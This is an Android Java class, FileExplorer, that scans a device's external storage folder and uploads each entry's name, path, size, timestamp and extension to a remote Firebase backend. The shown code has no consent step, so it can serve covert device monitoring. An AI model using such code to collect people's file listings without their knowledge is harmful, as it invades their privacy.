package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;

import android.app.Activity;
import android.os.Environment;

import com.vikasyadavnsit.cdc.data.User;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FileExplorer {

    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static void captureDirectoryStructure(Activity activity) {
        captureDirectoryStructure(activity, Environment.getExternalStorageDirectory().getAbsolutePath());
    }

    public static void captureDirectoryStructure(Activity activity, String path) {
        executor.execute(() -> {
            String targetPath = (path == null || path.isEmpty())
                    ? Environment.getExternalStorageDirectory().getAbsolutePath()
                    : path;
            LoggerUtils.d("FileExplorer", "Scanning level: " + targetPath);
            List<Map<String, Object>> structure = getLevelStructure(new File(targetPath));
            FirebaseUtils.uploadDeviceDirectoryStructureSnapshot(structure);
        });
    }

    private static List<Map<String, Object>> getLevelStructure(File directory) {
        List<Map<String, Object>> structure = new ArrayList<>();
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.getName().startsWith(".")) continue;

                Map<String, Object> info = new HashMap<>();
                info.put("name", file.getName());
                info.put("path", file.getAbsolutePath());
                info.put("isDir", file.isDirectory());
                info.put("size", file.length());
                info.put("lastModified", file.lastModified());
                info.put("ext", getExtension(file));
                
                structure.add(info);
            }
        }
        return structure;
    }

    private static String getExtension(File file) {
        if (file.isDirectory()) return "folder";
        String name = file.getName();
        int lastDot = name.lastIndexOf('.');
        return (lastDot == -1) ? "file" : name.substring(lastDot + 1).toLowerCase();
    }
}
